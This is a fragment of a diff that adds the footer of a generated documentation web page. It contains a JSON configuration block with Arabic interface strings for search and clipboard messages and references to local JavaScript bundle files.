+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u062a\u0645 \u0627\u0644\u0646\u0633\u062e \u0627\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "clipboard.copy": "\u0646\u0633\u062e \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "search.result.more.one": "\u0623\u0643\u062b\u0631 \u0645\u0646 1 \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.more.other": "\u0623\u0643\u062b\u0631 \u0645\u0646 # \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.none": "\u0644\u0627 \u062a\u0648\u062c\u062f \u0646\u062a\u0627\u0626\u062c", "search.result.one": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b \u0645\u0633\u062a\u0646\u062f \u0648\u0627\u062d\u062f", "search.result.other": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b # \u0645\u0633\u062a\u0646\u062f\u0627\u062a", "search.result.placeholder": "\u0627\u0643\u062a\u0628 \u0644\u0628\u062f\u0621 \u0627\u0644\u0628\u062d\u062b", "search.result.term.missing": "\u0645\u0641\u0642\u0648\u062f", "select.version": "\u0625\u062e\u062a\u0631 \u0627\u0644\u0625\u0635\u062f\u0627\u0631"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
